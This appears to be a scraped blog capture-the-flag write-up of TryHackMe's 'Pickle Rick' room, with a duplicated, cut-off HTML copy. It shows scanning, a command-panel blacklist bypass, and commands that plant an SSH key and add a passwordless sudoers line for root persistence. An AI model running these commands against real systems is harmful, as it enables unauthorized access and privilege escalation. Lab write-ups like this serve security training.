).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=10/10%OT=22%CT=1%CU=34787%PV=Y%DS=4%DC=T%G=Y%TM=61634D\nOS:BE%P=aarch64-unknown-linux-gnu)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=I%II=I%T\nOS:S=8)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=I%TS=8)OPS(O1=M506ST11NW7%O2=M506ST\nOS:11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=6\nOS:8DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M\nOS:506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T\nOS:4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+\nOS:%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y\nOS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%\nOS:RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nUptime guess: 0.017 days (since Sun Oct 10 14:06:48 2021)\nNetwork Distance: 4 hops\nTCP Sequence Prediction: Difficulty=261 (Good luck!)\nIP ID Sequence Generation: All zeros\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 3389/tcp)\nHOP RTT       ADDRESS\n1   31.96 ms  10.13.0.1\n2   ... 3\n4   172.74 ms 10.10.158.139\n\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at nmap.org/submit/ .\n# Nmap done at Sun Oct 10 14:31:58 2021 -- 1 IP address (1 host up) scanned in 864.62 seconds\n\nTry to get some more information by connecting with ssh.\nssh -v -F /dev/null \\\n    -o IdentityAgent=none R1ckRul3s@10.10.158.139\nLooks like password authentication is turned off — only the publickey method is available. So no brute forcing here — we need Rick’s private SSH key.\nNo obvious Apache or SSH RCEs for this version in Exploit DB…\nAt this point I’m basically stuck, so I decide to see if I can get a hint by (partially!) reading someone else’s walk-through. Most of the initial recon in that walk-through (I only scanned down that far) aligns with what I’ve already done, but it mentions two tools I’ve not yeat heard of — dirb (which looks like gobuster but possibly more straight-forward) and Nikto (which I know of but not about). So let’s try those!\ndirb http://10.10.158.139\nThe dirb command finds everything that gobuster did, as well as a robots.txt file. This file contains a single “word”: Wubbalubbadubdub. That doesn’t mean anything to me really (maybe it’s something that Rick would say), but maybe there will be a password field that I could try it out in…\nnikto -host 10.10.158.139\nNikto is a scanner for common web vulnerabilities. A couple of interesting things pop out from the scanning of the target system:\n\nDespite the simple page, it looks like the server is running PHP. So if I can figure out how to upload something, I’ve got a good shot at popping a reverse shell.\nThere’s a /login.php file. Now THAT looks interesting!\n\nFlag 1\nLet’s check out /login.php. This looks like a pretty straight-forward login page. No special headers show up when intercepting the response in Burp Suite, and again no JavaScript outside of the standard jQuery and Bootstrap libraries is loaded.\nLet’s try R1ckRul3s:Wubbalubbadubdub for our username:password.\nAnd, with a redirect to /portal.php, we’re in!\nLet’s poke around here a bit.\nAll of the links on this page except for the first one (“Commands”) go to /denied.php. That page again doesn’t include anything interesting (jQuery, Bootstrap, blah blah blah).\nSo all we’ve got is the mysterious “Command Panel”. There is also an HTML comment in the source of /portal.php with what looks like a base64-encoded string in it. But feeding this to base64 -d just results in an invalid input error.\nVm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==\n\nLet’s turn back to “Command Panel” and see what that does. Typing in ls reveals what looks like a listing of the website root directory! Two new files here:\n\n/Sup3rS3cretPickl3Ingred.txt\n/clue.txt\n\nViewing /Sup3rS3cretPickl3Ingred.txt revels the first flag.\nFlag 2\nLet’s continue poking around. Before we go back to /portal.php, let’s take a look at /clue.txt.\nLook around the file system for the other ingredient.\nWell, thank you Captain Obvious.\nLet’s see what we can do with the “Command Panel”.\n\ncat Sup3rS3cretPickl3Ingred.txt reveals that cat is disabled.\nls / reveals that we can list things outside of the webroot.\nls /home reveals two users: rick and ubuntu (so trying to SSH in as R1ckRul3s wouldn’t have worked anyway).\nls -la /home/rick reveals a second ingredients file… But no ~/.ssh directory! Damnit.\nls -la /home/ubuntu does reveal a ~/.ssh directory, but we can’t actually descend into it.\n\nAlright, so cat is disabled. But can I get at it another way? bash -c &quot;cat Sup3rS3cretPickl3Ingred.txt&quot; also doesn’t work. Neither does more Sup3rS3cretPickl3Ingred.txt. But less Sup3rS3cretPickl3Ingred.txt does work!\nLet’s get that second flag by executing less &quot;/home/rick/second ingredients&quot;.\nFlag 3\nLet’s get us some filesystem access. On a lark, I tried the command sudo whoami… And the answer is root! Jackpot!\nThough sudo less /etc/sudoers reveals that www-data has full sudo access without a password, so it’s really just as good.\nAnd… sudo ls -la /home/ubuntu/.ssh reveals no private SSH key.\nDoing less portal.php reveals that the mystery string is simply hard-coded, and nothing interesting is hidden in the other PHP files.\nI’m not sure where the final flag is, but I have enough access now to pop a full root shell. Unfortunately, I can’t seem to start nc through the “Command Panel”, so we’ll just do this the noisy way.\nFirst, on my local system create a new temporary SSH key pair using ssh-keygen -f ~/id_rsa. Then, enter the following commands in the “Command Panel”:\nsudo bash -c &#039;echo &quot;$CONTENTS_OF_TEMPORARY_ID_RSA_PUB_KEY&quot; &gt;&gt; /home/ubuntu/.ssh/authorized_keys&#039;\nsudo chown ubuntu.ubuntu /home/ubuntu/.ssh/authorized_keys\nsudo chmod 600 /home/ubuntu/.ssh/authorized_keys\nsudo bash -c &#039;echo &quot;ubuntu ALL=(ALL) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers&#039;\n(Here $CONTENTS_OF_TEMPORARY_ID_RSA_PUB_KEY is the contents of ~/id_rsa.pub.)\n\n\n                  \n                  Tip\n                  \n                \n\n\nThe “Command Panel” does a simple string match looking for “cat”, “more”, “tail”, “nano”, “vim”, and “vi”. The last one in particular can be a little problematic… You may have to run ssh-keygen a couple of times to get a key without “vi” as a substring.)\n\n\n\nWe can now access the box directly over SSH as the ubuntu user, and from there elevate to root using sudo.\nssh -i ~/id_rsa -F /dev/null \\\n    -o IdentityAgent=none ubuntu@10.10.158.139\nThough it turns out that I didn’t have to go this far… The third flag is just in the .bash_history file of the ubuntu user.\nOh well, I still got a root shell (albeit in a totally noisy fashion).\nElapsed Time: 3 h 11 min","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/picklerick&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;“Pickle Rick” on TryHackMe&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;h2 id=&quot;background&quot;&gt;Background&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#background&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;This is a &lt;a href=&quot;https://en.wikipedia.org/wiki/Rick_and_Morty&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Rick &amp;#x26; Morty&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; themed web server / CTF. The fact that I’ve never watched the show may put me at a disadvantage.&lt;/p&gt;\n&lt;p&gt;There are three flags (“ingredients Rick needs for a potion to transform themself from a pickle back into a human”). Because of how TryHackMe masks answers, we already know the basic form of these strings (&lt;code&gt;*&lt;/code&gt; characters are unknown, but &lt;code&gt; &lt;/code&gt; and &lt;code&gt;.&lt;/code&gt; characters are literals):&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;Flag 1: **. ******* ****\nFlag 2: * ***** ****\nFlag 3: ***** *****\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;I’m guessing that flag 1 begins with either numbers or an abbreviation (&lt;code&gt;Mr.&lt;/code&gt;?). Flag 2 probably begins with &lt;code&gt;A&lt;/code&gt;.&lt;/p&gt;\n&lt;p&gt;Because this is web server exploitation, it’s going to make sense to use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Burp-Suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Burp-Suite&quot;&gt;Burp Suite&lt;/a&gt;. In order to make the experience a little more pleasant, I’m going to add a pattern of &lt;code&gt;10.10.158.139&lt;/code&gt; (the IP address of the TryHackMe server I’m using) to FoxyProxy and then set it to “Use proxies based on their pre-defined patterns and priorities”; that way, only the CTF website will get proxied to &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Burp-Suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Burp-Suite&quot;&gt;Burp Suite&lt;/a&gt;.&lt;/p&gt;\n&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#recon&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;The server is running Apache 2.4.18 on some version of Ubuntu. The provided web page is very simple:&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;HELP MORTY!&lt;/p&gt;\n&lt;p&gt;Listen Morty… I need your help, I’ve turned myself into a pickle again and this time I can’t change back!&lt;/p&gt;\n&lt;p&gt;I need you to &lt;em&gt;BURRRP&lt;/em&gt;… Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is, I have no idea what the &lt;em&gt;BURRRRRRRRP&lt;/em&gt;, password was! Help Morty, Help!&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;There is no obvious place to login, upload files, or otherwise interact with the web server. No hint event that this is anything beyond a relatively static site (both jQuery and Bootstrap libraries are included, but there’s no hooks in the actual page.)&lt;/p&gt;\n&lt;p&gt;There’s a comment in the HTML that Rick’s username is &lt;code&gt;R1ckRul3s&lt;/code&gt;.&lt;/p&gt;\n&lt;p&gt;We look for directories of interest using &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/gobuster&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/gobuster&quot;&gt;gobuster&lt;/a&gt;.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;gobuster&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; dir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; http://10.10.158.139&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-w&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Discovered directories:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;/assets (website assets + a handful of Rick &amp;#x26; Morty image files)&lt;/li&gt;\n&lt;li&gt;/server-status (returns 403)&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Also probing the machine using &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nmap&quot;&gt;Nmap&lt;/a&gt;.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -vv&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -oA&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; pickle-rick&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -sS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10.10.158.139&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Output:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;# Nmap 7.91 scan initiated Sun Oct 10 14:17:34 2021 as: nmap -vv -A -oA pickle-rick -sS -p- 10.10.158.139\nNmap scan report for 10.10.158.139\nHost is up, received echo-reply ttl 61 (0.16s latency).\nScanned at 2021-10-10 14:17:36 MDT for 862s\nNot shown: 65533 closed ports\nReason: 65533 resets\nPORT   STATE SERVICE REASON         VERSION\n22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 1d:39:9b:09:99:36:f3:bc:fe:7c:83:99:92:3b:a7:6b (RSA)\n| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNZgE8CuciddazUr3rzoeSLp5UUW7FSMH7iGPEnz6E0GioM0ctbDfUtlp2jEOcetG3lnKzzD1JMPBh98h7ImpMSdpOMHRliy58a5CaBDv7O2boOUYrw0BiL9xHjEoeewTuKqHrsOal+o2M/Cmiho6K0FcHBmmf0/COnaT824p6XK5z7PYLuwoMF2Ujimz2hIFCFRn3eID0nCiMXxOUVI0Gn+m1xSDdOIqO7n9btU0oknWQ/QHbEMwVi/Hdv5b7xoO/MqiEAKVmvmsA483n8+uqhjmVXeYr/r588dUod0M1EY56RLgeiSnFWZ5D1bGxknmd+wh64At8MG4jZyDEhuVZ\n|   256 ab:aa:da:0b:5b:22:01:bc:75:54:91:e8:2a:b6:60:9e (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP74j/YgHBTZzXewO7k01lKCsNhH0h+qZBH5pvKkwoLvkiwVrmFMphtT+cHsdV5KnijsoRQtMolZyblXdHbVoOQ=\n|   256 7f:32:1f:37:2a:58:e7:d0:fb:91:a4:8c:12:8e:2e:d6 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFz+Ck64qc+5h2JvTgz7WYaLU4z+yu79Ug8CaW2vgP/9\n80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Rick is sup4r cool\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=10/10%OT=22%CT=1%CU=34787%PV=Y%DS=4%DC=T%G=Y%TM=61634D\nOS:BE%P=aarch64-unknown-linux-gnu)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=I%II=I%T\nOS:S=8)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=I%TS=8)OPS(O1=M506ST11NW7%O2=M506ST\nOS:11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=6\nOS:8DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M\nOS:506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T\nOS:4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+\nOS:%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y\nOS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%\nOS:RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nUptime guess: 0.017 days (since Sun Oct 10 14:06:48 2021)\nNetwork Distance: 4 hops\nTCP Sequence Prediction: Difficulty=261 (Good luck!)\nIP ID Sequence Generation: All zeros\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 3389/tcp)\nHOP RTT       ADDRESS\n1   31.96 ms  10.13.0.1\n2   ... 3\n4   172.74 ms 10.10.158.139\n\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Sun Oct 10 14:31:58 2021 -- 1 IP address (1 host up) scanned in 864.62 seconds\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Try to get some more information by connecting with ssh.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ssh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -F&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /dev/null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;    -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; IdentityAgent=none&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; R1ckRul3s@10.10.158.139&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Looks like password authentication is turned off — only the publickey method is available. So no brute forcing here — we need Rick’s private &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; key.&lt;/p&gt;\n&lt;p&gt;No obvious Apache or &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; RCEs for this version in Exploit DB…&lt;/p&gt;\n&lt;p&gt;At this point I’m basically stuck, so I decide to see if I can get a hint by (partially!) reading &lt;a href=&quot;https://razrexe.medium.com/tryhackme-pickle-rick-ctf-walkthrough-9ed36eff17fe&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;someone else’s walk-through&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;. Most of the initial recon in that walk-through (I only scanned down that far) aligns with what I’ve already done, but it mentions two tools I’ve not yeat heard of — dirb (which looks like &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/gobuster&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/gobuster&quot;&gt;gobuster&lt;/a&gt; but possibly more straight-forward) and &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Nikto&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nikto&quot;&gt;Nikto&lt;/a&gt; (which I know &lt;em&gt;of&lt;/em&gt; but not &lt;em&gt;about&lt;/em&gt;). So let’s try those!&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;dirb&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; http://10.10.158.139&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The dirb command finds everything that &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/gobuster&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/gobuster&quot;&gt;gobuster&lt;/a&gt; did, as well as a robots.txt file. This file contains a single “word”: &lt;code&gt;Wubbalubbadubdub&lt;/code&gt;. That doesn’t mean anything to me really (maybe it’s something that Rick would say), but maybe there will be a password field that I could try it out in…&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;nikto&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -host&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10.10.158.139&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Nikto&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nikto&quot;&gt;Nikto&lt;/a&gt; is a scanner for common web vulnerabilities. A couple of interesting things pop out from the scanning of the target system:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Despite the simple page, it looks like the server is running &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/PHP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/PHP&quot;&gt;PHP&lt;/a&gt;. So if I can figure out how to upload something, I’ve got a good shot at popping a reverse shell.&lt;/li&gt;\n&lt;li&gt;There’s a /login.php file. Now THAT looks interesting!&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h2 id=&quot;flag-1&quot;&gt;Flag 1&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#flag-1&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Let’s check out /login.php. This looks like a pretty straight-forward login page. No special headers show up when intercepting the response in &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Burp-Suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Burp-Suite&quot;&gt;Burp Suite&lt;/a&gt;, and again no JavaScript outside of the standard jQuery and Bootstrap libraries is loaded.&lt;/p&gt;\n&lt;p&gt;Let’s try R1ckRul3s:Wubbalubbadubdub for our username:password.&lt;/p&gt;\n&lt;p&gt;And, with a redirect to /portal.php, we’re in!&lt;/p&gt;\n&lt;p&gt;Let’s poke around here a bit.&lt;/p&gt;\n&lt;p&gt;All of the links on this page &lt;em&gt;except&lt;/em&gt; for the first one (“Commands”) go to /denied.php. That page again doesn’t include anything interesting (jQuery, Bootstrap, blah blah blah).&lt;/p&gt;\n&lt;p&gt;So all we’ve got is the mysterious “Command Panel”. There is also an HTML comment in the source of /portal.php with what &lt;em&gt;looks&lt;/em&gt; like a base64-encoded string in it. But feeding this to &lt;code&gt;base64 -d&lt;/code&gt; just results in an &lt;code&gt;invalid input&lt;/code&gt; error.&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Let’s turn back to “Command Panel” and see what that does. Typing in ls reveals what looks like a listing of the website root 